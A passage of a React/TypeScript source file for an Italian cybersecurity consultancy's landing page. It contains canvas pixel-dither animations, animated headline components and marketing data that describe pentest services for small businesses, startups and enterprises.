      ty = -0.44;
      tz = wallDist + 0.34;
      tileScale = u;
    } else {
      showTile = false;
    }

    if (showTile && tileScale > 0.18) {
      drawRotatedBox3D(
        buf,
        zBuf,
        cols,
        rows,
        [tx, ty, tz],
        [0.19 * tileScale, 0.19 * tileScale, 0.06 * tileScale],
        tRx,
        tRy,
        rx,
        ry,
        cubeScale,
        cubeCx,
        cubeCy,
        16,
        0.16,
        colorBuf,
        1, // BIANCO!
        true
      );
    }

    // 5. Nucleo interno + Flusso di dati cibernetici (bianco + viola) fuori dal buco aperto
    if (holeOpen > 0.08) {
      const streamEnv = Math.min(1, holeOpen * 1.15);

      // Nucleo pulsante dentro la cavità nera del buco
      const coreSize = (0.18 + 0.04 * Math.sin(t * 9)) * streamEnv;
      drawRotatedBox3D(
        buf,
        zBuf,
        cols,
        rows,
        [0, 0, -0.05],
        [coreSize, coreSize, coreSize],
        t * 1.9,
        t * 1.4,
        rx,
        ry,
        cubeScale,
        cubeCx,
        cubeCy,
        14,
        0.2,
        colorBuf,
        1,
        true
      );

      // 6 corsie di flusso dati cibernetici in uscita dal buco centrale verso destra (+Z + +X)
      const laneOffsets: Array<[number, number, number]> = [
        [0.0, 0.0, 0.0],
        [-0.14, -0.1, 0.95],
        [0.14, -0.11, 2.05],
        [-0.13, 0.13, 3.15],
        [0.13, 0.11, 4.25],
        [0.02, -0.16, 5.2],
      ];

      const zStart = 0.05;
      const zLen = 2.85;

      for (let lIdx = 0; lIdx < laneOffsets.length; lIdx++) {
        const [ox0, oy0, phaseSeed] = laneOffsets[lIdx];

        // Scia continua halftone viola che esce dal foro e piega verso la zona libera a destra
        const trailSteps = 38;
        for (let si = 0; si <= trailSteps; si++) {
          const u = si / trailSteps;
          const lz = zStart + u * zLen;
          const postHole = Math.max(0, (lz - (wallDist + 0.02)) / (zLen + zStart - wallDist));
          const spread = 1 + postHole * 2.1;
          const waveX = Math.sin(u * 8.0 - t * 6.8 + phaseSeed) * 0.09 * (0.2 + postHole);
          const waveY = Math.cos(u * 6.5 - t * 6.0 + phaseSeed) * 0.07 * (0.2 + postHole);
          const lx = ox0 * spread + postHole * 1.15 + waveX;
          const ly = oy0 * spread - postHole * 0.08 + waveY;

          const rp = rotatePoint(lx, ly, lz, rx, ry);
          const persp = 4.5 / (4.5 - Math.min(3.4, rp[2]) * 0.4);
          const sx = cubeCx + rp[0] * cubeScale * persp;
          const sy = cubeCy + rp[1] * cubeScale * persp;

          const pulseWave = 0.5 + 0.5 * Math.sin(u * 15 - t * 10 + phaseSeed);
          const tailFade = u > 0.72 ? Math.max(0, 1 - (u - 0.72) / 0.28) : 1;
          const carrierLum = (0.34 + 0.42 * pulseWave) * streamEnv * tailFade;
          if (carrierLum > 0.16) {
            splatPoint(buf, zBuf, cols, rows, sx, sy, rp[2] + 0.25, carrierLum, 0, colorBuf, 0, true);
          }
        }

        // Pacchetti 3D bianchi + scie bit che schizzano fuori dal buco
        for (let pkt = 0; pkt < 3; pkt++) {
          const u = (t * 0.92 + phaseSeed * 0.19 + pkt * 0.333) % 1;
          const lz = zStart + u * zLen;
          const postHole = Math.max(0, (lz - (wallDist + 0.02)) / (zLen + zStart - wallDist));
          const spread = 1 + postHole * 2.1;
          const waveX = Math.sin(u * 8.0 - t * 6.8 + phaseSeed) * 0.09 * (0.2 + postHole);
          const waveY = Math.cos(u * 6.5 - t * 6.0 + phaseSeed) * 0.07 * (0.2 + postHole);
          const lx = ox0 * spread + postHole * 1.15 + waveX;
          const ly = oy0 * spread - postHole * 0.08 + waveY;

          const fadeTail = u > 0.74 ? Math.max(0, 1 - (u - 0.74) / 0.26) : 1;
          const pktLum = Math.min(1, (0.98 * fadeTail + 0.16) * streamEnv);
          if (pktLum < 0.18) continue;

          if (lIdx % 2 === 0 && pkt === 0 && u > 0.15 && u < 0.88) {
            const ps = (0.075 - postHole * 0.015) * streamEnv;
            drawRotatedBox3D(
              buf,
              zBuf,
              cols,
              rows,
              [lx, ly, lz],
              [ps, ps * 0.85, ps * 1.4],
              t * 2.4 + phaseSeed,
              t * 1.9 + pkt,
              rx,
              ry,
              cubeScale,
              cubeCx,
              cubeCy,
              14,
              0.22,
              colorBuf,
              1,
              true
            );
          } else {
            const rpHead = rotatePoint(lx, ly, lz, rx, ry);
            const pHead = 4.5 / (4.5 - Math.min(3.4, rpHead[2]) * 0.4);
            splatPoint(
              buf,
              zBuf,
              cols,
              rows,
              cubeCx + rpHead[0] * cubeScale * pHead,
              cubeCy + rpHead[1] * cubeScale * pHead,
              rpHead[2] + 0.35,
              pktLum,
              u < 0.72 ? 1 : 0,
              colorBuf,
              1,
              true
            );
            for (let tr = 1; tr <= 3; tr++) {
              const ut = Math.max(0, u - tr * 0.028);
              const lzt = zStart + ut * zLen;
              const postT = Math.max(0, (lzt - (wallDist + 0.02)) / (zLen + zStart - wallDist));
              const spreadT = 1 + postT * 2.1;
              const lxt = ox0 * spreadT + postT * 1.15 + Math.sin(ut * 8.0 - t * 6.8 + phaseSeed) * 0.09 * (0.2 + postT);
              const lyt = oy0 * spreadT - postT * 0.08 + Math.cos(ut * 6.5 - t * 6.0 + phaseSeed) * 0.07 * (0.2 + postT);
              const rpt = rotatePoint(lxt, lyt, lzt, rx, ry);
              const ptPersp = 4.5 / (4.5 - Math.min(3.4, rpt[2]) * 0.4);
              splatPoint(
                buf,
                zBuf,
                cols,
                rows,
                cubeCx + rpt[0] * cubeScale * ptPersp,
                cubeCy + rpt[1] * cubeScale * ptPersp,
                rpt[2] + 0.3,
                pktLum * (1 - tr * 0.22),
                0,
                colorBuf,
                tr === 1 ? 1 : 0,
                true
              );
            }
          }
        }
      }
    }
    return;
  }

  if (kind === "maze") {
    const rx = 0.68 + my * 0.25;
    const ry = 0.78 + t * 0.35 + mx * 0.45;
    const s = baseScale * 0.88;
    // Griglia labirinto isometrica tipo wireframe/blocchi 3D
    const blocks: Array<[Vec3, Vec3]> = [
      [[0, 0.25, 0], [0.95, 0.06, 0.95]],
      [[-0.55, 0, -0.55], [0.28, 0.24, 0.1]],
      [[0.15, 0, -0.6], [0.35, 0.24, 0.1]],
      [[-0.65, 0, 0.15], [0.1, 0.26, 0.48]],
      [[0.0, 0, 0.0], [0.28, 0.3, 0.28]],
      [[0.62, 0, 0.1], [0.1, 0.24, 0.52]],
      [[-0.2, 0, 0.62], [0.46, 0.22, 0.1]],
      [[0.48, 0, -0.2], [0.22, 0.32, 0.12]],
    ];
    for (const [c, h] of blocks) {
      drawFilledBox3D(buf, zBuf, cols, rows, c, h, rx, ry, s, cx, cy, 10);
    }
    return;
  }

  if (kind === "cluster") {
    const rx = 0.42 + my * 0.32;
    const ry = t * 0.55 + mx * 0.55;
    const s = baseScale * 0.88;
    const voxels: Array<[Vec3, Vec3]> = [
      [[0, 0, 0], [0.42, 0.42, 0.42]],
      [[0.48, -0.35, 0.2], [0.26, 0.26, 0.26]],
      [[-0.45, 0.3, -0.15], [0.3, 0.28, 0.24]],
      [[-0.28, -0.45, 0.38], [0.22, 0.32, 0.22]],
      [[0.32, 0.44, -0.34], [0.24, 0.24, 0.28]],
      [[0.0, -0.56, -0.25], [0.2, 0.22, 0.22]],
    ];
    for (const [c, h] of voxels) {
      drawFilledBox3D(buf, zBuf, cols, rows, c, h, rx, ry, s, cx, cy, 11);
    }
    return;
  }

  if (kind === "dome" || kind === "sunDome") {
    const isBottomRising = kind === "sunDome";
    const radius = isBottomRising ? 0.85 : 0.72;
    const centerY = isBottomRising ? 1.0 : 0.88;
    for (let gy = 0; gy < rows; gy++) {
      const ny = gy / rows;
      for (let gx = 0; gx < cols; gx++) {
        const nx = (gx / cols - 0.5) * (cols / rows) * 1.3;
        const dy = centerY - ny;
        if (dy < 0) continue;
        const r = Math.hypot(nx, dy);
        if (r > radius) continue;
        // Illuminazione sferica verso il centro basso
        const z = Math.sqrt(Math.max(0, radius * radius - r * r));
        const light = Math.max(0.08, (z / radius) * 0.88 + Math.sin(t * 0.8) * 0.06);
        buf[gy * cols + gx] = Math.min(1, light);
      }
    }
    return;
  }

  if (kind === "torus") {
    const rx = 0.78 + my * 0.35;
    const ry = t * 0.65 + mx * 0.5;
    const R = 0.74;
    const r = 0.28;
    const s = baseScale * 1.05;
    const stepsU = 56;
    const stepsV = 26;
    for (let iu = 0; iu < stepsU; iu++) {
      const u = (iu / stepsU) * Math.PI * 2;
      const cu = Math.cos(u);
      const su = Math.sin(u);
      for (let iv = 0; iv < stepsV; iv++) {
        const v = (iv / stepsV) * Math.PI * 2;
        const cv = Math.cos(v);
        const sv = Math.sin(v);
        const ox = (R + r * cv) * cu;
        const oy = (R + r * cv) * su;
        const oz = r * sv;
        const rp = rotatePoint(ox, oy, oz, rx, ry);
        const nx = cv * cu;
        const ny = cv * su;
        const nz = sv;
        const rn = rotatePoint(nx, ny, nz, rx, ry);
        if (rn[2] < -0.1) continue;
        const persp = 4.4 / (4.4 - rp[2] * 0.4);
        const sx = cx + rp[0] * s * persp;
        const sy = cy + rp[1] * s * persp;
        const lum = Math.max(0.18, 0.35 + rn[0] * 0.35 - rn[1] * 0.38 + rn[2] * 0.45);
        splatPoint(buf, zBuf, cols, rows, sx, sy, rp[2], Math.min(1, lum), 1);
      }
    }
    return;
  }

  if (kind === "star") {
    const rx = 0.32 + my * 0.35;
    const ry = Math.sin(t * 0.75) * 0.45 + mx * 0.45;
    const rz = t * 0.3;
    const cz = Math.cos(rz);
    const sz = Math.sin(rz);
    const s = baseScale * 1.05;
    // Stella 3D a 4 punte concave
    for (let iy = -34; iy <= 34; iy++) {
      const y = (iy / 34) * 1.05;
      for (let ix = -34; ix <= 34; ix++) {
        const x = (ix / 34) * 1.05;
        const xR = x * cz - y * sz;
        const yR = x * sz + y * cz;
        const ax = Math.abs(xR);
        const ay = Math.abs(yR);
        // Equazione ipocicloide / stella a 4 punte
        const d = Math.pow(ax, 0.58) + Math.pow(ay, 0.58);
        if (d > 1.02) continue;
        const thickness = (1.02 - d) * 0.38;
        for (const sign of [-1, 1]) {
          const rp = rotatePoint(x, y, sign * thickness, rx, ry);
          const persp = 4.4 / (4.4 - rp[2] * 0.4);
          const sx = cx + rp[0] * s * persp;
          const sy = cy + rp[1] * s * persp;
          const lum = Math.max(0.22, 0.88 - ax * 0.32 - (sign < 0 ? 0.35 : 0));
          splatPoint(buf, zBuf, cols, rows, sx, sy, rp[2], lum, 0);
        }
      }
    }
    return;
  }

  if (kind === "hollowCube") {
    const rx = 0.52 + my * 0.35;
    const ry = t * 0.58 + mx * 0.5;
    const s = baseScale * 0.92;
    // 12 travi spesse di un cubo cavo geometrico (come frame 1:27 EVOLVE)
    const d = 0.72;
    const thick = 0.14;
    const beams: Array<[Vec3, Vec3]> = [
      [[0, -d, -d], [d, thick, thick]],
      [[0, d, -d], [d, thick, thick]],
      [[0, -d, d], [d, thick, thick]],
      [[0, d, d], [d, thick, thick]],
      [[-d, 0, -d], [thick, d, thick]],
      [[d, 0, -d], [thick, d, thick]],
      [[-d, 0, d], [thick, d, thick]],
      [[d, 0, d], [thick, d, thick]],
      [[-d, -d, 0], [thick, thick, d]],
      [[d, -d, 0], [thick, thick, d]],
      [[-d, d, 0], [thick, thick, d]],
      [[d, d, 0], [thick, thick, d]],
    ];
    for (const [c, h] of beams) {
      drawFilledBox3D(buf, zBuf, cols, rows, c, h, rx, ry, s, cx, cy, 8);
    }
  }
}

export function PixelDitherCanvas({
  kind,
  color,
  bgColor = "transparent",
  width = 480,
  height = 360,
  cellSize = 6,
  interactive = true,
  explode = 0,
  className = "",
  style,
}: PixelDitherCanvasProps) {
  const canvasRef = useRef<HTMLCanvasElement | null>(null);
  const pointerRef = useRef({ x: 0, y: 0, tx: 0, ty: 0 });
  const explodeTargetRef = useRef(explode);
  const isVisibleRef = useRef(true);

  useEffect(() => {
    explodeTargetRef.current = explode;
  }, [explode]);

  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext("2d", { alpha: true });
    if (!ctx) return;

    const cols = Math.max(12, Math.floor(width / cellSize));
    const rows = Math.max(12, Math.floor(height / cellSize));
    const buf = new Float32Array(cols * rows);
    const zBuf = new Float32Array(cols * rows);
    const colorBuf = new Uint8Array(cols * rows);

    const reducedMotion =
      typeof window !== "undefined" &&
      window.matchMedia("(prefers-reduced-motion: reduce)").matches;

    let rafId = 0;
    let time = 0.6;
    let currentExplode = explodeTargetRef.current;
    let exploitCycle = reducedMotion ? 0.66 : 0;
    let lastTs = performance.now();

    const drawFrame = (now: number) => {
      const dt = Math.min(0.05, (now - lastTs) / 1000);
      lastTs = now;
      if (!reducedMotion) {
        time += dt;
      }

      const p = pointerRef.current;
      p.x += (p.tx - p.x) * 0.08;
      p.y += (p.ty - p.y) * 0.08;
      if (kind === "exploitCube") {
        const target = explodeTargetRef.current;
        currentExplode += (target - currentExplode) * (target > currentExplode ? 0.12 : 0.08);
        if (target > 0.5) {
          if (!reducedMotion) {
            exploitCycle = (exploitCycle + dt / 6.0) % 1;
          } else {
            exploitCycle = 0.66;
          }
        } else {
          exploitCycle *= Math.max(0, 1 - dt * 4);
        }
      } else {
        currentExplode += (explodeTargetRef.current - currentExplode) * 0.08;
      }

      renderSceneToBuffer(kind, buf, zBuf, cols, rows, time, p.x, p.y, currentExplode, exploitCycle, colorBuf);

      if (bgColor === "transparent") {
        ctx.clearRect(0, 0, width, height);
      } else {
        ctx.fillStyle = bgColor;
        ctx.fillRect(0, 0, width, height);
      }

      let activeColor = color;
      ctx.fillStyle = activeColor;
      const gapUnit = Math.max(1, Math.floor(cellSize / 6));

      for (let gy = 0; gy < rows; gy++) {
        const y = gy * cellSize;
        const bRow = BAYER_8X8[gy & 7];
        for (let gx = 0; gx < cols; gx++) {
          const cellIdx = gy * cols + gx;
          const lum = buf[cellIdx];
          if (lum < 0.08) continue;

          const bayerVal = bRow[gx & 7] / 64;
          const level = lum + (bayerVal - 0.5) * 0.22;
          if (level < 0.08) continue;

          const nextColor = colorBuf[cellIdx] === 1 ? "#F4F3FA" : color;
          if (nextColor !== activeColor) {
            activeColor = nextColor;
            ctx.fillStyle = activeColor;
          }
          const x = gx * cellSize;

          if (level < 0.24) {
            // Micro punto centrale 2x2
            const s = Math.max(1, Math.round(cellSize * 0.33));
            const off = Math.floor((cellSize - s) * 0.5);
            ctx.fillRect(x + off, y + off, s, s);
          } else if (level < 0.44) {
            // Quadrato medio 3x3
            const s = Math.max(2, Math.round(cellSize * 0.5));
            const off = Math.floor((cellSize - s) * 0.5);
            ctx.fillRect(x + off, y + off, s, s);
          } else if (level < 0.66) {
            // Firma del Reel: croce halftone (+ e × alternate a scacchiera)
            const parity = (gx + gy) & 1;
            const s = cellSize - gapUnit;
            const mid = Math.floor(cellSize * 0.5);
            if (parity === 0) {
              ctx.fillRect(x, y + mid - Math.floor(gapUnit * 0.5), s, gapUnit);
              ctx.fillRect(x + mid - Math.floor(gapUnit * 0.5), y, gapUnit, s);
            } else {
              const q = Math.max(1, gapUnit);
              ctx.fillRect(x + q, y + q, s - q * 2, s - q * 2);
              ctx.fillRect(x, y, q, q);
              ctx.fillRect(x + s - q, y + s - q, q, q);
            }
          } else if (level < 0.86) {
            // Quadrato denso con gap netto da 1px
            ctx.fillRect(x, y, cellSize - gapUnit, cellSize - gapUnit);
          } else {
            // Blocco solido pieno
            ctx.fillRect(x, y, cellSize, cellSize);
          }
        }
      }

      if (!reducedMotion && isVisibleRef.current) {
        rafId = requestAnimationFrame(drawFrame);
      }
    };

    const observer = new IntersectionObserver(
      (entries) => {
        const entry = entries[0];
        if (!entry) return;
        isVisibleRef.current = entry.isIntersecting;
        if (entry.isIntersecting && !reducedMotion) {
          cancelAnimationFrame(rafId);
          lastTs = performance.now();
          rafId = requestAnimationFrame(drawFrame);
        } else if (!entry.isIntersecting) {
          cancelAnimationFrame(rafId);
        }
      },
      { threshold: 0.05 }
    );

    observer.observe(canvas);
    drawFrame(performance.now());

    return () => {
      observer.disconnect();
      cancelAnimationFrame(rafId);
    };
  }, [kind, color, bgColor, width, height, cellSize]);

  const handlePointerMove = useCallback(
    (e: React.PointerEvent<HTMLCanvasElement>) => {
      if (!interactive) return;
      const rect = e.currentTarget.getBoundingClientRect();
      const nx = ((e.clientX - rect.left) / rect.width - 0.5) * 2;
      const ny = ((e.clientY - rect.top) / rect.height - 0.5) * 2;
      pointerRef.current.tx = nx;
      pointerRef.current.ty = ny;
    },
    [interactive]
  );

  const handlePointerLeave = useCallback(() => {
    pointerRef.current.tx = 0;
    pointerRef.current.ty = 0;
  }, []);

  return (
    <canvas
      ref={canvasRef}
      width={width}
      height={height}
      onPointerMove={handlePointerMove}
      onPointerLeave={handlePointerLeave}
      className={className}
      style={{
        display: "block",
        imageRendering: "pixelated",
        borderRadius: 0,
        ...style,
      }}
    />
  );
}


/* ============================================================================
 * MICRO-ANIMAZIONI TIPOGRAFICHE FEDELI AL REEL
 * ========================================================================== */

/** 1. PixelDissolveBadge: dissolvenza pixel 5px blu/bianco originale (senza rosso né badge) */
function PixelDissolveBadge({
  text,
  bg = PALETTE.blue,
  fg = PALETTE.bg,
  triggerKey,
  fontSize = "clamp(2rem, 5vw, 4.2rem)",
  padding = "0.08em 0.28em",
}: {
  text: string;
  bg?: string;
  fg?: string;
  triggerKey?: string | number;
  fontSize?: string;
  padding?: string;
}) {
  const [dissolving, setDissolving] = useState(false);
  const canvasRef = useRef<HTMLCanvasElement | null>(null);
  const wrapRef = useRef<HTMLSpanElement | null>(null);

  useEffect(() => {
    setDissolving(true);
    const wrap = wrapRef.current;
    const canvas = canvasRef.current;
    if (!wrap || !canvas) {
      const t = setTimeout(() => setDissolving(false), 320);
      return () => clearTimeout(t);
    }

    const w = Math.max(80, Math.round(wrap.offsetWidth));
    const h = Math.max(36, Math.round(wrap.offsetHeight));
    canvas.width = w;
    canvas.height = h;
    const ctx = canvas.getContext("2d");
    if (!ctx) return;

    const cell = 5;
    const cols = Math.ceil(w / cell);
    const rows = Math.ceil(h / cell);
    let step = 0;
    const maxSteps = 9;

    const interval = setInterval(() => {
      step++;
      ctx.clearRect(0, 0, w, h);
      const density = step <= 4 ? 0.35 + step * 0.14 : 1 - (step - 4) * 0.18;
      for (let gy = 0; gy < rows; gy++) {
        for (let gx = 0; gx < cols; gx++) {
          const hash = ((gx * 73856093) ^ (gy * 19349663) ^ (step * 83492791)) & 255;
          if (hash / 255 < density) {
            ctx.fillStyle = hash % 5 === 0 ? PALETTE.ink : bg;
            ctx.fillRect(gx * cell, gy * cell, cell - 1, cell - 1);
          }
        }
      }
      if (step >= maxSteps) {
        clearInterval(interval);
        ctx.clearRect(0, 0, w, h);
        setDissolving(false);
      }
    }, 36);

    return () => clearInterval(interval);
  }, [text, triggerKey, bg]);

  return (
    <span
      ref={wrapRef}
      style={{
        position: "relative",
        display: "inline-flex",
        alignItems: "center",
        background: bg,
        color: fg,
        fontFamily: DISPLAY_FONT,
        fontWeight: 700,
        fontSize,
        lineHeight: 0.92,
        letterSpacing: "-0.02em",
        textTransform: "uppercase",
        padding,
        borderRadius: 0,
        userSelect: "none",
      }}
    >
      <span style={{ opacity: dissolving ? 0.35 : 1, transition: "opacity 80ms linear" }}>
        {text}
      </span>
      <canvas
        ref={canvasRef}
        aria-hidden="true"
        style={{
          position: "absolute",
          inset: 0,
          width: "100%",
          height: "100%",
          pointerEvents: "none",
          imageRendering: "pixelated",
        }}
      />
    </span>
  );
}


/** 1a. HeroEvolveTitle: "THE THREATS" + [EVOLVE] -> EVOLVE sale sopra THE THREATS -> a destra YOUR e sotto BUSINESS */
function HeroEvolveTitle({
  replayKey,
  onReplay,
}: {
  replayKey: number;
  onReplay: () => void;
}) {
  const [phase, setPhase] = useState<"initial" | "rising" | "your" | "business">("initial");
  const [metrics, setMetrics] = useState({ riseY: 120, evolveW: 360 });
  const containerRef = useRef<HTMLHeadingElement | null>(null);
  const evolveRef = useRef<HTMLDivElement | null>(null);

  useEffect(() => {
    const measure = () => {
      if (!evolveRef.current) return;
      setMetrics({
        riseY: evolveRef.current.offsetTop,
        evolveW: evolveRef.current.offsetWidth,
      });
    };
    measure();
    window.addEventListener("resize", measure);
    return () => window.removeEventListener("resize", measure);
  }, [replayKey]);

  useEffect(() => {
    setPhase("initial");
    const t1 = setTimeout(() => setPhase("rising"), 1450);
    const t2 = setTimeout(() => setPhase("your"), 2020);
    const t3 = setTimeout(() => setPhase("business"), 2340);
    return () => {
      clearTimeout(t1);
      clearTimeout(t2);
      clearTimeout(t3);
    };
  }, [replayKey]);

  const isRising = phase !== "initial";
  const showYour = phase === "your" || phase === "business";
  const showBusiness = phase === "business";

  return (
    <h1
      ref={containerRef}
      onClick={onReplay}
      style={{
        position: "relative",
        margin: 0,
        display: "flex",
        flexDirection: "column",
        alignItems: "flex-start",
        gap: "0.18em",
        textTransform: "uppercase",
        cursor: "pointer",
        width: "100%",
      }}
    >
      {/* Riga 1: THE THREATS (svanisce quando EVOLVE sale a coprirla) */}
      <span
        style={{
          fontFamily: DISPLAY_FONT,
          fontWeight: 700,
          fontSize: "clamp(2.8rem, 7.8vw, 7.4rem)",
          lineHeight: 0.94,
          letterSpacing: "-0.02em",
          color: PALETTE.ink,
          opacity: isRising ? 0 : 1,
          transform: isRising ? "translateY(-14px)" : "translateY(0)",
          transition: "opacity 340ms ease, transform 420ms ease",
          pointerEvents: "none",
        }}
      >
        THE THREATS
      </span>

      {/* Riga 2: EVOLVE (parte sotto, poi sale fino a y = 0 coprendo THE THREATS) */}
      <div
        ref={evolveRef}
        style={{
          position: "relative",
          zIndex: 2,
          transform: isRising ? `translateY(-${metrics.riseY}px)` : "translateY(0)",
          transition: "transform 620ms cubic-bezier(0.22, 1, 0.36, 1)",
        }}
      >
        <PixelDissolveBadge
          text="EVOLVE"
          triggerKey={replayKey}
          bg={PALETTE.blue}
          fg={PALETTE.ink}
          fontSize="clamp(3.3rem, 9.5vw, 9.2rem)"
          padding="0.08em 0.28em"
        />
      </div>

      {/* A destra di EVOLVE compare YOUR e sotto BUSINESS */}
      <div
        style={{
          position: "absolute",
          top: 0,
          left: `${metrics.evolveW + 24}px`,
          display: "flex",
          flexDirection: "column",
          alignItems: "flex-start",
          gap: "0.14em",
          pointerEvents: "none",
        }}
      >
        <span
          style={{
            fontFamily: DISPLAY_FONT,
            fontWeight: 700,
            fontSize: "clamp(2.8rem, 7.8vw, 7.4rem)",
            lineHeight: 0.94,
            letterSpacing: "-0.02em",
            color: PALETTE.ink,
            opacity: showYour ? 1 : 0,
            transform: showYour ? "translateY(0)" : "translateY(18px)",
            transition: "opacity 360ms ease, transform 420ms cubic-bezier(0.22, 1, 0.36, 1)",
          }}
        >
          YOUR
        </span>
        <span
          style={{
            fontFamily: DISPLAY_FONT,
            fontWeight: 700,
            fontSize: "clamp(2.8rem, 7.8vw, 7.4rem)",
            lineHeight: 0.94,
            letterSpacing: "-0.02em",
            color: PALETTE.ink,
            opacity: showBusiness ? 1 : 0,
            transform: showBusiness ? "translateY(0)" : "translateY(18px)",
            transition: "opacity 380ms ease, transform 440ms cubic-bezier(0.22, 1, 0.36, 1)",
          }}
        >
          BUSINESS
        </span>
      </div>
    </h1>
  );
}


/** 2. TypewriterBar: scrive lettera per lettera spingendo il cursore verticale | */
function TypewriterBar({
  text,
  cursorColor = PALETTE.blue,
  speedMs = 45,
  style,
}: {
  text: string;
  cursorColor?: string;
  speedMs?: number;
  style?: React.CSSProperties;
}) {
  const [shown, setShown] = useState(text);
  const rootRef = useRef<HTMLSpanElement | null>(null);
  const startedRef = useRef(false);

  useEffect(() => {
    const el = rootRef.current;
    if (!el) return;

    const runTyping = () => {
      if (startedRef.current) return;
      startedRef.current = true;
      let i = 0;
      setShown("");
      const timer = setInterval(() => {
        i++;
        setShown(text.slice(0, i));
        if (i >= text.length) clearInterval(timer);
      }, speedMs);
    };

    const obs = new IntersectionObserver(
      (entries) => {
        if (entries[0]?.isIntersecting) {
          runTyping();
          obs.disconnect();
        }
      },
      { threshold: 0.2 }
    );
    obs.observe(el);
    return () => obs.disconnect();
  }, [text, speedMs]);

  return (
    <span ref={rootRef} style={{ display: "inline-flex", alignItems: "center", ...style }}>
      <span>{shown}</span>
      <span
        aria-hidden="true"
        style={{
          display: "inline-block",
          width: "0.08em",
          minWidth: "3px",
          height: "0.95em",
          background: cursorColor,
          marginLeft: "0.08em",
          verticalAlign: "middle",
        }}
      />
    </span>
  );
}


/** 3. ScrambleMono: decodifica testo monospace stile "Challenge your assumptions" (1:14) */
function ScrambleMono({
  text,
  triggerKey,
  style,
}: {
  text: string;
  triggerKey?: string | number;
  style?: React.CSSProperties;
}) {
  const [output, setOutput] = useState(text);

  useEffect(() => {
    const glyphs = "_/=#01.";
    let frame = 0;
    const totalFrames = 14;
    const timer = setInterval(() => {
      frame++;
      const lockedCount = Math.floor((frame / totalFrames) * text.length);
      let next = "";
      for (let i = 0; i < text.length; i++) {
        if (text[i] === " " || i < lockedCount) {
          next += text[i];
        } else {
          next += glyphs[(i * 7 + frame * 3) % glyphs.length];
        }
      }
      setOutput(next);
      if (frame >= totalFrames) {
        clearInterval(timer);
        setOutput(text);
      }
    }, 32);

    return () => clearInterval(timer);
  }, [text, triggerKey]);

  return (
    <span style={{ fontFamily: MONO_FONT, ...style }}>
      {output}
    </span>
  );
}


/* ============================================================================
 * DATI STRATEGICI CYBERSEC PER I 4 TARGET (Imprenditori, PMI, Startup, Multi)
 * ========================================================================== */
type BuyerSegmentKey = "pmi" | "startup" | "enterprise";

const BUYER_SEGMENTS: Record<
  BuyerSegmentKey,
  {
    code: string;
    badgeWord: string;
    badgeColor: string;
    label: string;
    headline: string;
    pain: string;
    trigger: string;
    vector: string;
    deliverable: string;
    sla: string;
    pillars: string[];
  }
> = {
  pmi: {
    code: "01 // IMPRENDITORI & PMI",
    badgeWord: "CONTINUITY",
    badgeColor: PALETTE.red,
    label: "Protezione Patrimonio & Continuità Aziendale",
    headline: "Evitare il fermo azienda prima che accada il riscatto.",
    pain: "Un ransomware o una frode sui bonifici (BEC) blocca produzione, fatturazione e reputazione in 20 minuti. I fornitori IT generici installano antivirus ma non testano mai le vere vie d'ingresso.",
    trigger: "Vedere con chiarezza da dove entra un attaccante nella propria rete/gestionale e chiudere i varchi senza burocrazia né rallentare i dipendenti.",
    vector: "Esposizione VPN/RDP senza MFA rigida, portali fornitori con sessioni deboli, backup raggiungibili dalla rete interna.",
    deliverable: "Verifica perimetrale completa + Piano d'azione chiaro in italiano per la direzione + Affiancamento diretto al team IT per la messa in sicurezza.",
    sla: "Report esecutivo in 5 giorni lavorativi · Conformità GDPR / NIS2",
    pillars: ["Perimetro", "Backup Zero-Trust", "Identità & Accessi", "Continuità"],
  },
  startup: {
    code: "02 // STARTUP & SAAS / AI",
    badgeWord: "VELOCITY",
    badgeColor: PALETTE.blue,
    label: "Sblocca Deal Enterprise & Due Diligence Investitori",
    headline: "Passa il security audit del cliente B2B in giorni, non in mesi.",
    pain: "Il prodotto funziona ma un questionario di sicurezza Enterprise o una falla sulle API/LLM rischia di far saltare il contratto più grande dell'anno.",
    trigger: "Niente PDF da 200 pagine generati da tool automatici: vogliono test chirurgici sulla logica delle API e il codice della patch pronto per il merge nella Pull Request.",
    vector: "BOLA/IDOR multi-tenant sulle API, JWT malleabili, Indirect Prompt Injection su agenti AI/RAG con esfiltrazione contesto.",
    deliverable: "Proof-of-Concept riproducibili step-by-step + Diff di codice pronti per Next.js/Node/Python + Attestato tecnico per investitori e clienti Enterprise.",
    sla: "Audit completo & Re-Test in 7 giorni · Patch pronte su GitHub",
    pillars: ["API & Auth Logic", "Multi-Tenancy", "AI & LLM Guardrails", "CI/CD Gates"],
  },
  enterprise: {
    code: "03 // MULTINAZIONALI & CORPORATE",
    badgeWord: "DEPTH",
    badgeColor: PALETTE.ink,
    label: "Offensive Security Manuale dove gli Scanner Sono Ciechi",
    headline: "Trovare le catene d'exploit che superano WAF, SOC e SAST.",
    pain: "Scanner automatici e audit formali generano migliaia di falsi positivi ma mancano le vulnerabilità di logica di business, privilege escalation orizzontale e lateral movement cloud.",
    trigger: "Un ingaggio chirurgico sotto NDA rigoroso che simula un avversario umano persistente su asset critici, parlando sia al CISO/Board sia al team DevSecOps.",
    vector: "Concatenazione di race condition su flussi finanziari, SSRF verso metadata cloud IAM, bypass di RBAC tra microservizi distribuiti.",
    deliverable: "Dossier doppio (Executive Risk Matrix per il Board + PoC & Remediation Guide per Ingegneria) + Sessione dedicata di Re-Test certificato.",
    sla: "Scoping sotto NDA in 24h · Re-Test incluso a zero attriti",
    pillars: ["Business Logic", "Cloud IAM & K8s", "Code Review", "Red Teaming"],
  },
};

const RE_PILLARS: Array<{
  prefix: string;
  verb: string;
  color: string;
  scene: DitherSceneKind;
  concept: string;
  desc: string;
}> = [
  {
    prefix: "DE",
    verb: "CONSTRUCT",
    color: PALETTE.red,
    scene: "cube",
    concept: "first principles // attack surface",
    desc: "Smontiamo architettura, ruoli, endpoint e pipeline CI/CD partendo dai fondamentali, prima ancora di lanciare un singolo pacchetto.",
  },
  {
    prefix: "EX",
    verb: "PLOIT",
    color: "#8B46FF",
    scene: "exploitCube",
    concept: "business logic // zero false positives",
    desc: "Test d'intrusione 100% manuali dentro il labirinto dei permessi e delle API: ogni falla viene dimostrata con un Proof-of-Concept reale.",
  },
  {
    prefix: "RE",
    verb: "MEDIATE",
    color: PALETTE.ink,
    scene: "cluster",
    concept: "what's possible // patched & verified",
    desc: "Scriviamo insieme al tuo team la correzione esatta nel codice sorgente e rieseguiamo il test finale per certificare la chiusura totale.",
  },
];

const EVOLUTION_STAGES: Array<{
  id: string;
  label: string;
  sequence: string[];
  subheadline: string;
}> = [
  {
    id: "static-perimeter",
